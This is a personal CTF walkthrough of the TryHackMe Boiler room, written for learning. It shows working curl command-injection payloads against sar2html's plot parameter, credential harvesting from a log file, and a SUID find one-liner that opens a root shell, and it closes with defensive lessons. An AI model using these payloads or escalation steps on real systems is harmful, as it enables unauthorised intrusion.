# TryHackMe -- Boiler CTF Walkthrough

> **Room:** Boiler CTF\
> **Platform:** TryHackMe\
> **Difficulty:** Beginner-friendly Linux enumeration and privilege
> escalation\
> **Status:** Completed --- user and root flags retrieved

This README documents my learning process while solving the Boiler CTF
room. It covers service enumeration, web discovery, command injection,
credential discovery, SSH access, Linux user enumeration, and SUID-based
privilege escalation.

> **Lab safety:** The commands and target references below are intended
> only for the assigned TryHackMe machine or another environment where
> you have explicit permission to test. Replace `TARGET_IP` with the IP
> assigned to your own room instance. The IP and credentials shown in
> this walkthrough were specific to my lab instance and may not work for
> other deployments.

------------------------------------------------------------------------

## 1. Attack flow

``` mermaid
flowchart TD
    A["Start: Boiler CTF"] --> B["Nmap service enumeration"]
    B --> C["FTP :21 — anonymous access"]
    B --> D["HTTP :80 — Apache / Joomla"]
    B --> E["SSH :55007"]
    C --> F["Read .info.txt"]
    F --> G["Decode ROT13 clue"]
    D --> H["Enumerate hidden web paths"]
    H --> I["Find Joomla sar2html test page"]
    I --> J["Command injection via plot parameter"]
    J --> K["Command execution as www-data"]
    K --> L["Read log.txt"]
    L --> M["Discover basterd SSH credentials"]
    M --> N["SSH as basterd"]
    N --> O["Inspect backup.sh"]
    O --> P["Discover stoner password"]
    P --> Q["Switch to stoner"]
    Q --> R["Find hidden .secrete user flag"]
    Q --> S["Enumerate SUID files"]
    S --> T["Find root-owned SUID /usr/bin/find"]
    T --> U["Use find to launch privileged shell"]
    U --> V["Read /root/root.txt"]
    R --> W["CTF completed"]
    V --> W
```

## 2. Initial enumeration

I started by scanning all TCP ports and identifying service versions:

``` bash
nmap -sC -sV -p- TARGET_IP
```

The important services discovered during my run were:

     Port Service   Finding
  ------- --------- ------------------------------------
       21 FTP       Anonymous login was permitted
       80 HTTP      Apache web server hosting Joomla
    55007 SSH       SSH service on a non-standard port
    10000 Webmin    Webmin service

**Note:** The highest open port in my scan was `55007`, which was SSH.
Port `10000` was Webmin.

## 3. FTP enumeration

I connected to FTP and checked the available files:

``` bash
ftp TARGET_IP
```

Anonymous access was enabled. The `.info.txt` file contained an encoded
message:

``` text
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

I decoded it using ROT13. The message read:

``` text
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

This was a clue to continue enumerating the target.

## 4. Web enumeration

I visited the web server and enumerated directories. The Joomla
installation was available under:

``` text
http://TARGET_IP/joomla/
```

The `robots.txt` file listed several paths worth checking. Further
enumeration led to the Joomla test directory:

``` text
http://TARGET_IP/joomla/_test/
```

The page exposed a `sar2html` application.

## 5. Command injection in sar2html

The application accepted a `plot` parameter. I tested whether input was
being passed to an operating-system command by sending a harmless
identity check:

``` bash
curl -sG \
  --data-urlencode 'plot=;id' \
  'http://TARGET_IP/joomla/_test/index.php' \
  -o result.html
```

I inspected the response:

``` bash
grep -inE 'uid=|www-data|gid=' result.html
```

The response showed execution as:

``` text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I confirmed the account and working directory with similar tests:

``` bash
curl -sG --data-urlencode 'plot=;whoami' \
  'http://TARGET_IP/joomla/_test/index.php' -o whoami.html

curl -sG --data-urlencode 'plot=;pwd' \
  'http://TARGET_IP/joomla/_test/index.php' -o pwd.html
```

The command output was reflected in the HTML response. This confirmed
command injection and command execution as the web-server account,
`www-data`.

## 6. Credential discovery in the application log

I listed the application directory and found `log.txt`. I read it
through the same command-injection point:

``` bash
curl -sG --data-urlencode 'plot=;cat log.txt' \
  'http://TARGET_IP/joomla/_test/index.php' -o log.html
```

The log contained an SSH authentication entry with credentials for the
`basterd` account.

**Lesson:** Application logs should not expose passwords or other
authentication secrets. Credentials should be rotated if they are
accidentally logged.

## 7. SSH access as basterd

SSH was running on port `55007`, so I connected using the discovered lab
credentials:

``` bash
ssh -p 55007 basterd@TARGET_IP
```

After login, I confirmed the account and location:

``` bash
whoami
id
pwd
```

The session was running as `basterd`.

## 8. Move from basterd to stoner

I inspected the backup script:

``` bash
cat /home/basterd/backup.sh
```

A commented line in the script exposed a password clue for the `stoner`
account. I switched users:

``` bash
su - stoner
```

I entered the password discovered in the lab script and confirmed the
new account:

``` bash
whoami
id
```

I was now operating as `stoner`.

## 9. Find the user flag

The user flag was stored in a hidden file in the stoner home directory:

``` text
/home/stoner/.secrete
```

A normal `ls` does not show dot-prefixed files. I used:

``` bash
ls -la /home/stoner/
```

The `-a` option displays hidden entries. I read the discovered file to
retrieve the user flag:

``` bash
cat /home/stoner/.secrete
```

## 10. SUID enumeration and privilege escalation

As `stoner`, I enumerated SUID executables:

``` bash
find / -perm -4000 -type f 2>/dev/null
```

The list included:

``` text
/usr/bin/find
```

I checked its permissions:

``` bash
ls -l /usr/bin/find
stat /usr/bin/find
id
```

The important permission output was:

``` text
-r-sr-xr-x 1 root root ... /usr/bin/find
```

The file was owned by `root` and had the SUID bit set. In this lab, that
unsafe configuration allowed the SUID `find` executable to start a shell
while preserving its effective privileges.

I used:

``` bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Then verified the resulting identity:

``` bash
id
whoami
```

The effective user ID was root, confirming successful privilege
escalation.

## 11. Retrieve the root flag

With the privileged shell, I read:

``` bash
cat /root/root.txt
```

The root flag file contained:

``` text
It wasn't that hard, was it?
```

------------------------------------------------------------------------

## 12. Final results

  Objective                              Result
  -------------------------------------- -----------
  Initial service enumeration            Completed
  FTP anonymous access and ROT13 clue    Completed
  Joomla / sar2html discovery            Completed
  Command injection as `www-data`        Completed
  Credential discovery from `log.txt`    Completed
  SSH access as `basterd`                Completed
  Switch to `stoner`                     Completed
  User flag at `/home/stoner/.secrete`   Retrieved
  Root-owned SUID `find` discovery       Completed
  Root privilege escalation              Completed
  Root flag at `/root/root.txt`          Retrieved

## 13. Vulnerabilities and defensive lessons

1.  **Anonymous FTP access:** Disable anonymous access unless it is
    explicitly required, and ensure exposed files contain no sensitive
    information.
2.  **Command injection:** Avoid passing untrusted input to shell
    commands. Use safe APIs, strict input validation, and
    least-privilege service accounts.
3.  **Credential exposure in logs:** Never log passwords, tokens, or
    other secrets. Rotate credentials if exposed.
4.  **Credential reuse and weak secret handling:** Use unique, managed
    credentials and restrict access to scripts containing secrets.
5.  **Unsafe SUID configuration:** Remove SUID from programs that do not
    require it. Audit SUID executables and apply least privilege.
6.  **Hidden files are not access controls:** A leading dot hides a
    filename from ordinary listings; it does not protect the file.

## 14. Key commands learned

``` bash
# Scan all TCP ports and identify services
nmap -sC -sV -p- TARGET_IP

# Show hidden files
ls -la

# Inspect a file's permissions and ownership
ls -l /path/to/file
stat /path/to/file

# Search for SUID executables
find / -perm -4000 -type f 2>/dev/null

# Check the current identity
id
whoami
```

## Disclaimer

This is a personal educational write-up of an authorized TryHackMe
practice machine. Target addresses, open ports, credentials, and file
contents can differ between room instances. Do not use these techniques
against systems without explicit authorization.
